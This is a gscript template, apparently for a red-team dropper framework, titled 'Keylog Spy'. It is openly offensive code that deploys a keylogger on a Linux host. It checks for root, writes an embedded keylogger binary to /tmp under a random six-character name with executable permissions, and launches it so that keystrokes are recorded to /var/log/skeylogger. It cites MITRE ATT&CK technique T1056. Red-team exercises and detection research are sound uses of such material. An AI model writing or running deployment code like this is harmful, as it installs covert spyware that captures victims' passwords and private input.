// Example gscript template
// Title: Keylog Spy
// Author: ahhh
// Purpose: Starts recording keylogs, saves them in /var/log/skeylogger
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1056
// Using this keylogger: https://github.com/gsingh93/simple-key-logger

//priority:150
//timeout:150
//import:/private/tmp/keylogger.elf


function BeforeDeploy() {
  LogInfo("Starting keylogger spy");
  var well = GetUser();
  LogInfo("Our user is: "+well.username);
  if (well.username == "root") {
    return true;
  } else {
    LogInfo("Detected a non-root user, this needs to run as root!");
    Halt();
    return false;
  }
  return true; 
}

function Deploy() {  
  // Drop the sample
  var spy = Asset("keylogger.elf");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 6; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "/tmp/"+name;
  WriteFile(name, spy.fileData, 0755);
  LogInfo("dropped the spy binary here: "+name);
    
  ForkExecuteCommand(name, [""]);
  return true;
}

function AfterDeploy() {
  LogInfo("Done keylogger spy");
  return true;
}
